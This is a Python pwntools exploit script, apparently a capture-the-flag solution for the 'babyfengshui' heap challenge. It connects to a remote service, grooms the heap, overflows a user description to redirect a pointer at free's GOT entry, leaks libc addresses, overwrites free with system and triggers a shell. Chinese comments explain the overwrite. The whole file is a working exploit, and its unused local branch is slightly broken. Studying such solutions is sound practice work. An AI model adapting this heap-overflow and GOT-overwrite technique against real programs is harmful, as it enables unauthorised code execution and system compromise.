from pwn import *
import sys

local = 1
if local == 1:
    io = remote('111.198.29.45',50983)
else:
    io.process()


elf = ELF('babyfengshui')
libc = ELF('libc.so.6')

def add_user(size, length, text):
    io.sendlineafter("Action: ", '0')
    io.sendlineafter("description: ", str(size))
    io.sendlineafter("name: ", 'AAAA')
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)

def delete_user(idx):
    io.sendlineafter("Action: ", '1')
    io.sendlineafter("index: ", str(idx))

def display_user(idx):
    io.sendlineafter("Action: ", '2')
    io.sendlineafter("index: ", str(idx))

def update_desc(idx, length, text):
    io.sendlineafter("Action: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("length: ", str(length))
    io.sendlineafter("text: ", text)

if __name__ == "__main__":
    add_user(0x80, 0x80, 'AAAA')        # 0
    add_user(0x80, 0x80, 'AAAA')        # 1
    add_user(0x8, 0x8, '/bin/sh\x00')   # 2
    delete_user(0)

    add_user(0x100, 0x19c, "A"*0x198 + p32(elf.got['free']))    # 0 覆盖指向1的数据的指针，位于2中。将其覆盖为free的got表的指针，所以输出的是实际地址
             #因为原来的数据也是一个指针，一个指针输出的并不是本身的值，而是指向的地址的数据。同理可以通过这个指针去修改数据
    display_user(1)
    io.recvuntil("description: ")
    free_addr = u32(io.recvn(4))
    log.success("free_addr:" + hex(free_addr))
    libc_base = free_addr - libc.symbols['free']
    log.success("libc_base:"+ hex(libc_base))
    system_addr = free_addr - (libc.symbols['free'] - libc.symbols['system'])
    log.info("system address: 0x%x" % system_addr)

    update_desc(1, 0x4, p32(system_addr)) #修改free的got表地址的值为system的实际地址
    delete_user(2)

    io.interactive()
